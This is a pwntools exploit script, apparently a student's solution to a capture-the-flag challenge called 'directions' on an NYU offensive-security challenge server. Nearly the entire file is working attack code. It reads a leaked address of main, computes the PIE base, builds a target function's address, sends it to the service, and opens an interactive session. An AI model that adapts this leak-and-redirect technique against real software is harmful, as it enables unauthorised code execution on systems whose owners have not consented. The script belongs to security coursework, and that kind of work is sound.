from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "directions"
PORT = 1244
NETID = b"os2178"
LOCAL = False

if LOCAL:
	p = process(CHALLENGE)
else:
	p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
	p.recvuntil(b"NetID (something like abc123): ")
	p.sendline(NETID)
	p.recvuntil(b"somewhere: ")
	
mainOffset = "0x1223"
functionOffset = "0x1245"

mainAddress = p.recvuntil(b"\n").strip()
mainAddress = mainAddress[::-1]
mainAddress = "0x" + mainAddress.hex()

baseAddress = hex(int(mainAddress, 16) - int(mainOffset, 16))
functionAddress = hex(int(baseAddress, 16) + int(functionOffset, 16))

functionAddress = functionAddress[2:]
functionAddress = "0000" + functionAddress
functionAddress = bytes.fromhex(functionAddress)
functionAddress = functionAddress[::-1]
print(functionAddress)

print(p.recvuntil(b"> ").decode())
p.sendline(functionAddress)
p.interactive()